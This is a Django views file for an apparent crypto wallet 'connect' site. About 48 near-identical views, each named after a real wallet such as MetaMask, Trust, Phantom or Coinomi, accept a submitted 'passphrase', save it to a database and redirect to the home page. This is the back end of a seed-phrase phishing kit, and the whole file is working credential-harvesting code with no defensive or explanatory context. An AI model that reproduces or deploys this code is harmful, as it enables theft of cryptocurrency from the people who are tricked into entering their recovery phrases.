from django.shortcuts import render, redirect, get_object_or_404

from .models import *

# Create your views here.
def home(request):
    template_name = 'index.html'
    return render(request, template_name)

def wallet(request):
    template_name = 'wallets.html'
    return render(request, template_name)

def connect(request):
    template_name = 'connect.html'
    return render(request, template_name)

def bitpay_views(request):
    template_name = 'connect.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        bitpay = BitPay.objects.create(passphrase=passphrase,)
        bitpay.save()
        return redirect('node:home')
    return render(request, template_name)

def solana_views(request):
    template_name = 'connect1.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        solana = Solana.objects.create(passphrase=passphrase,)
        solana.save()
        return redirect('node:home')
    return render(request, template_name)


def trust_views(request):
    template_name = 'connect2.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        trust = Trust.objects.create(passphrase=passphrase,)
        trust.save()
        return redirect('node:home')
    return render(request, template_name)

def metamask_views(request):
    template_name = 'connect3.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        metamask = Metamask.objects.create(passphrase=passphrase,)
        metamask.save()
        return redirect('node:home')
    return render(request, template_name)

def huobiwallet_views(request):
    template_name = 'connect4.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        huobiwallet = HuobiWallet.objects.create(passphrase=passphrase,)
        huobiwallet.save()
        return redirect('node:home')
    return render(request, template_name)

def phantom_views(request):
    template_name = 'connect5.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        phantom = Phantom.objects.create(passphrase=passphrase,)
        phantom.save()
        return redirect('node:home')
    return render(request, template_name)

def wazirx_views(request):
    template_name = 'connect6.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        wazirx = Wazirx.objects.create(passphrase=passphrase,)
        wazirx.save()
        return redirect('node:home')
    return render(request, template_name)

def pillar_views(request):
    template_name = 'connect7.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        pillar = Pillar.objects.create(passphrase=passphrase,)
        pillar.save()
        return redirect('node:home')
    return render(request, template_name)

def tokenpocket_views(request):
    template_name = 'connect8.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        tokenpocket = Tokenpocket.objects.create(passphrase=passphrase,)
        tokenpocket.save()
        return redirect('node:home')
    return render(request, template_name)

def atomic_views(request):
    template_name = 'connect9.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        atomic = Atomic.objects.create(passphrase=passphrase,)
        atomic.save()
        return redirect('node:home')
    return render(request, template_name)

def walleth_views(request):
    template_name = 'connect10.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        walleth = Walleth.objects.create(passphrase=passphrase,)
        walleth.save()
        return redirect('node:home')
    return render(request, template_name)

def authereum_views(request):
    template_name = 'connect11.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        authereum = Authereum.objects.create(passphrase=passphrase,)
        authereum.save()
        return redirect('node:home')
    return render(request, template_name)

def eidoo_views(request):
    template_name = 'connect12.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        eidoo = Eidoo.objects.create(passphrase=passphrase,)
        eidoo.save()
        return redirect('node:home')
    return render(request, template_name)

def zelcore_views(request):
    template_name = 'connect13.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        zelcore = Zelcore.objects.create(passphrase=passphrase,)
        zelcore.save()
        return redirect('node:home')
    return render(request, template_name)

def nash_views(request):
    template_name = 'connect14.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        nash = Nash.objects.create(passphrase=passphrase,)
        nash.save()
        return redirect('node:home')
    return render(request, template_name)

def coinomi_views(request):
    template_name = 'connect15.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        coinomi = Coinomi.objects.create(passphrase=passphrase,)
        coinomi.save()
        return redirect('node:home')
    return render(request, template_name)

def gridplus_views(request):
    template_name = 'connect16.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        gridplus = Gridplus.objects.create(passphrase=passphrase,)
        gridplus.save()
        return redirect('node:home')
    return render(request, template_name)

def coolwallets_views(request):
    template_name = 'connect17.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        coolwallets = CoolWalletS.objects.create(passphrase=passphrase,)
        coolwallets.save()
        return redirect('node:home')
    return render(request, template_name)

def alice_views(request):
    template_name = 'connect18.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        alice = Alice.objects.create(passphrase=passphrase,)
        alice.save()
        return redirect('node:home')
    return render(request, template_name)

def alphawallet_views(request):
    template_name = 'connect19.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        alphawallet = AlphaWallet.objects.create(passphrase=passphrase,)
        alphawallet.save()
        return redirect('node:home')
    return render(request, template_name)

def tokenary_views(request):
    template_name = 'connect20.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        tokenary = Tokenary.objects.create(passphrase=passphrase,)
        tokenary.save()
        return redirect('node:home')
    return render(request, template_name)

def safepal_views(request):
    template_name = 'connect21.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        safepal = Safepal.objects.create(passphrase=passphrase,)
        safepal.save()
        return redirect('node:home')
    return render(request, template_name)

def equal_views(request):
    template_name = 'connect22.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        equal = Equal.objects.create(passphrase=passphrase,)
        equal.save()
        return redirect('node:home')
    return render(request, template_name)

def infinito_views(request):
    template_name = 'connect23.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        infinito = Infinito.objects.create(passphrase=passphrase,)
        infinito.save()
        return redirect('node:home')
    return render(request, template_name)

def mathwallet_views(request):
    template_name = 'connect24.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        mathwallet = Mathwallet.objects.create(passphrase=passphrase,)
        mathwallet.save()
        return redirect('node:home')
    return render(request, template_name)

def mykey_views(request):
    template_name = 'connect26.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        mykey = MyKey.objects.create(passphrase=passphrase,)
        mykey.save()
        return redirect('node:home')
    return render(request, template_name)

def spatium_views(request):
    template_name = 'connect27.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        spatium = Spatium.objects.create(passphrase=passphrase,)
        spatium.save()
        return redirect('node:home')
    return render(request, template_name)

def walletio_views(request):
    template_name = 'connect28.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        walletio = Walletio.objects.create(passphrase=passphrase,)
        walletio.save()
        return redirect('node:home')
    return render(request, template_name)

def infinitywallet_views(request):
    template_name = 'connect29.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        infinitywallet = InfinityWallet.objects.create(passphrase=passphrase,)
        infinitywallet.save()
        return redirect('node:home')
    return render(request, template_name)

def ownbit_views(request):
    template_name = 'connect30.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        ownbit = OwnBit.objects.create(passphrase=passphrase,)
        ownbit.save()
        return redirect('node:home')
    return render(request, template_name)

def easypocket_views(request):
    template_name = 'connect31.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        easypocket = EasyPocket.objects.create(passphrase=passphrase,)
        easypocket.save()
        return redirect('node:home')
    return render(request, template_name)

def onto_views(request):
    template_name = 'connect32.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        onto = ONTO.objects.create(passphrase=passphrase,)
        onto.save()
        return redirect('node:home')
    return render(request, template_name)

def bridgewallet_views(request):
    template_name = 'connect33.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        bridgewallet = BridgeWallet.objects.create(passphrase=passphrase,)
        bridgewallet.save()
        return redirect('node:home')
    return render(request, template_name)

def sparkpoint_views(request):
    template_name = 'connect35.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        sparkpoint = SparkPoint.objects.create(passphrase=passphrase,)
        sparkpoint.save()
        return redirect('node:home')
    return render(request, template_name)

def viawallet_views(request):
    template_name = 'connect36.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        viawallet = ViaWallet.objects.create(passphrase=passphrase,)
        viawallet.save()
        return redirect('node:home')
    return render(request, template_name)

def coin98_views(request):
    template_name = 'connect37.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        coin98 = Coin98.objects.create(passphrase=passphrase,)
        coin98.save()
        return redirect('node:home')
    return render(request, template_name)

def bitkeep_views(request):
    template_name = 'connect38.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        bitkeep = BitKeep.objects.create(passphrase=passphrase,)
        bitkeep.save()
        return redirect('node:home')
    return render(request, template_name)

def vision_views(request):
    template_name = 'connect39.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        vision = Vision.objects.create(passphrase=passphrase,)
        vision.save()
        return redirect('node:home')
    return render(request, template_name)

def sfwtallet_views(request):
    template_name = 'connect40.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        sfwtallet = SFWTWallet.objects.create(passphrase=passphrase,)
        sfwtallet.save()
        return redirect('node:home')
    return render(request, template_name)

def peakdefi_views(request):
    template_name = 'connect41.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        peakdefi = PeakDefi.objects.create(passphrase=passphrase,)
        peakdefi.save()
        return redirect('node:home')
    return render(request, template_name)

def xdcwallet_views(request):
    template_name = 'connect42.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        xdcwallet = XDCWallet.objects.create(passphrase=passphrase,)
        xdcwallet.save()
        return redirect('node:home')
    return render(request, template_name)

def unstoppablewallet_views(request):
    template_name = 'connect43.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        unstoppablewallet = UnstoppableWallet.objects.create(passphrase=passphrase,)
        unstoppablewallet.save()
        return redirect('node:home')
    return render(request, template_name)

def meetone_views(request):
    template_name = 'connect44.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        meetone = MEETONE.objects.create(passphrase=passphrase,)
        meetone.save()
        return redirect('node:home')
    return render(request, template_name)

def dokwallet_views(request):
    template_name = 'connect45.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        dokwallet = DOKWallet.objects.create(passphrase=passphrase,)
        dokwallet.save()
        return redirect('node:home')
    return render(request, template_name)

def atwallet_views(request):
    template_name = 'connect46.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        atwallet = ATWallet.objects.create(passphrase=passphrase,)
        atwallet.save()
        return redirect('node:home')
    return render(request, template_name)

def morixwallet_views(request):
    template_name = 'connect47.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        morixwallet = MoriXWallet.objects.create(passphrase=passphrase,)
        morixwallet.save()
        return redirect('node:home')
    return render(request, template_name)

def midaswallet_views(request):
    template_name = 'connect48.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        midaswallet = MidasWallet.objects.create(passphrase=passphrase,)
        midaswallet.save()
        return redirect('node:home')
    return render(request, template_name)

def others_views(request):
    template_name = 'connect49.html'
    if request.method == 'POST':
        passphrase = request.POST['passphrase']
        others = Others.objects.create(passphrase=passphrase,)
        others.save()
        return redirect('node:home')
    return render(request, template_name)